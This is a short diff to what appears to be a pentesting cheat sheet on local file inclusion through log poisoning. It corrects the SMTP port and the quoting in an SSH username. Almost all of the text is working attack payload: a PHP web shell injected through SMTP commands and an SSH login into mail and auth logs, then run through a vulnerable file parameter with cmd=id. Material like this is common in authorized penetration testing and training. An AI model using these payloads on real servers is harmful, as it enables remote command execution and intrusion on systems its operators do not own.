@@ -711,7 +711,7 @@ http://ip/index.php?file=/var/log/apache2/access.log&cmd=id
   
 -> SMTP  
 ```
-telnet ip 23
+telnet ip 25
 MAIL FROM: email@gmail.com
 RCPT TO: <?php system($_GET[‘cmd’]); ?>  
 http://ip/index.php?file=/var/mail/mail.log&cmd=id
@@ -719,7 +719,7 @@ http://ip/index.php?file=/var/mail/mail.log&cmd=id
   
 -> SSH  
 ```
-ssh \'<?php system($_GET['cmd']);?>'@ip  
+ssh '<?php system($_GET["cmd"]);?>'@ip  
 http://ip/index.php?file=/var/log/auth.log&cmd=id
 ```  
 
